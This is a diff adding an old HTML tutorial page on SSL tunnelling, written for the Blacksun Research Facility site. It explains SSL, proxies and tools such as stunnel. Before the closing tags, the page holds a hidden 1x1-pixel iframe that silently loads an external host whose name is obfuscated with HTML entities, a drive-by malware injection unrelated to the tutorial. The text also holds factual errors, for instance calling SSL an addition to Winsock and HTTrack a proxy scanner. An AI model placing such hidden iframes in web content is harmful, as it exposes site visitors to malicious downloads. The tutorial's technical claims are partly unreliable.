@@ -1,0 +1,145 @@
+<html>
+<body>
+ <Br>
+<br>
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="45%"> SSL Tunneling</CENTER>
+
+<CENTER>Written by: <A HREF="mailto:matt@guysjs.org">Matt</A></CENTER>
+
+<CENTER>For <A HREF="http://blacksun.box.sk">Blacksun Research Facility [BSRF]</a></CENTER>
+
+<CENTER><A HREF="http://blacksun.box.sk">http://blacksun.box.sk</A></CENTER>
+
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="54%"></CENTER>
+<br>
+ 
+<h4>What is SSL?</h4>
+<br>
+SSL stands for Secure Socket Layer. The 'Secure' implies an <br>
+encryption, while Socket Layer denotes an addition to the Window Socket system,<br> 
+Winsock. For those that don't know, a Socket is an attachment to a port<br> 
+on a system. You can have many sockets on one port, providing they are <br>
+non-blocking (allowing control to pass through to another socket aware <br>
+application which wishes to connect to that port). <br><br>
+ 
+A Secure Socket Layer means that any sockets under it, are both secure <br>
+and safe. The idea behind SSL was to provide an encrypted, and thus, <br>
+secure route for traffic along a socket based system, such as TCP/IP <br>
+(the internet protocol). Doing this allows security in credit card <br>
+transactions on the Internet, encrypted and protected communiqué along a <br>
+data line, and overall peace of mind. <br>
+  <br>
+The SSL uses an encryption standard developed by RSA. RSA are a world <br>
+respected American organisation that specializes in encryption and data <br>
+security. Initially, they developed a cipher length of only 40 bits, for <br>
+use with the Secure Socket Layer, this was considered weak and therefore <br>
+a longer much more complicated encryption cipher was created, 128 bits. <br>
+The reasoning behind it was simple: it needs to be secure. <br>
+  <br>
+The RSA site puts the advantage of a longer encryption length pretty clearly: <br>
+because 40-bit encryption is considered to be relatively weak. 128-bits<br>
+is about 309 septillion times ( 309,485,000,000,000,000,000,000,000 )<br>
+larger than 40-bits. This would mean it would take that many times<br>
+longer to crack or break 128-bit encryption than it would 40-bit.<br>
+ <br>
+  
+If you want more information on the technicalities or RSA's SSL <br>
+encryption engine, visit their site: <br>
+<br>
+<a href="http://www.rsasecurity.com/standards/ssl">http://www.rsasecurity.com/standards/ssl</a>. <br>
+<br>  
+But what does all this encryption and security have to do with you? <br>
+Well, that's a simple question. No matter how hard you try, at times <br>
+your privacy will need to be knowingly invaded so you can make use of <br>
+the product offered for doing so. If you think about food, for example, <br>
+one cannot eat without swallowing. When we wish to make a transaction or <br>
+view a site on the internet, where we have to give enough information <br>
+away so that it happens, we also want to be assured no one else along <br>
+the line gathers that data. An encrypted session would mean our data is <br>
+not at the hands of any privacy perpetrators unless they knew how to <br>
+decode it - and the only ones in the know, are those you specifically <br>
+wish. SSL uses public key encryption as explained in the PGP section. <br>
+  <br>
+To put this at a head: if you use an encrypted connection or session, <br>
+you can be relatively assured that there are no prying eyes along the <br>
+way. <br>
+ <br>
+ 
+<b>And how do I implement SSL with SSL Tunnelling?</b> <br><br>
+We know that a Secure Socket Layer is safe, but what we don't know is <br>
+what a Tunnel is. In the most simplistic form, a tunnel is a proxy. Like <br>
+proxy voting in general elections, a tunnel will relay your data back <br>
+and forth for you. You may be aware though, that there are already <br>
+'proxies' out there, and yes, that is true. Tunnelling is done via <br>
+proxies, but it is not considered to be the same as a standard proxy <br>
+relaying simply because it isn't. <br>
+  <br>
+Tunnelling is very special kind of proxy relay, in that it can, and does <br>
+relay data without interfering. It does this transparently and without <br>
+grievance or any care for what is passing its way. <br>
+  <br>
+Now, if we add this ability to 'tunnel' data, any data, in a pipe, to <br>
+the Secure Sockets Layer, we have a closed connection that is <br>
+independent of the software carrying it; and something that is also <br>
+encrypted. For those of you wanting to know a little more about the <br>
+technicalities, the SSL layer is also classless in the sense it does not<br> 
+interferer with the data passed back and forth - after all, it is <br>
+encrypted and impossible to tamper with. That attribute means an SSL <br>
+capable proxy is able to transfer data out of its 'proxied' connection <br>
+to the destination required. <br>
+  <br>
+So to sum up, we have both a secure connection that does the job and <br>
+relays things in the right direction; and we have direct tunnel that <br>
+doesn't care what we pass through it. Two very useful, and almost blind <br>
+entities. All we need now is a secure proxy that we can use as the <br>
+tunnel. <br>
+  <br>
+<b>Then proxies:</b><br> <br>
+Secure proxies are alike standard proxies. We can either use an HTTP <br>
+base SSL equipped proxy - one specifically designed for security HTTP <br>
+traffic, but because of the ignorant nature of SSL communication, it can <br>
+be bent to any needs - or we can use a proper SSL service designed for <br>
+our connection - like you would use a secure NNTP (news) program with a <br>
+secure proxy on port 563 instead of taking our long way - which would <br>
+probably work as well. <br>
+  <br>
+A secure HTTP proxy operates on port 443. Host proxies are not public, <br>
+that means they operate for, and allow only traffic from their subnet or <br>
+the ISP that operates them - but, there are many badly configured HTTP <br>
+proxies and some public ones out there. The use of a program called <br>
+HTTrack (available on Neworder) will aid you in scanning and searching <br>
+for proxies on your network or anywhere on the Internet if your ISP does <br>
+not provide you with one. <br>
+  <br>
+Neworder also features a number of sites dedicated to listing public <br>
+proxies in the Anonymity section. While it's often hard to find a <br>
+suitable fast proxy, it's worth the effort when you get one. <br>
+  <br>
+So how can I secure my connections with SSL Tunnelling? <br>
+That's a big question, and beyond the scope out this tuition as it must <br>
+come to and end. I can however, point you in the right direction of two <br>
+resources that will aid you in tunnelling both IRC, and most other <br>
+connections via a HTTP proxy. <br>
+  <br>
+For Windows, the first stop would be <a href="http://www.totalrc.net">http://www.totalrc.net's,</a> <br>
+Socks2HTTP. This is an SSL tunnelling program that turns a normal socks <br>
+proxy connection into a tunnelled SSL connection. <br>
+  
+The second stop, for both Windows and Unix is stunnel. Stunnel is a GNU <br>
+kit developed for SSL tunnelling any connection. It is available for <br>
+compile and download as binary here: Stunnel homepage - <br>
+<a href="http://mike.daewoo.com.pl/computer/stunnel">http://mike.daewoo.com.pl/computer/stunnel</a> <br>
+  <br>
+ <b>Matt</b> <br>
+  <br>
+Oh, lastly, I do have an old security 'tip' I've written up (sadly it <br>
+made neworder first, I'm sorry, but I do like neworder!) and has <br>
+promptly vanished off the edge of the board for ever. <br>
+  <br>
+It's not as long as above, half the size, and talks about "find /home <br>
+--perm 0777 -type f --print &gt;&gt; worldwriteable.txt" :))) <br>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
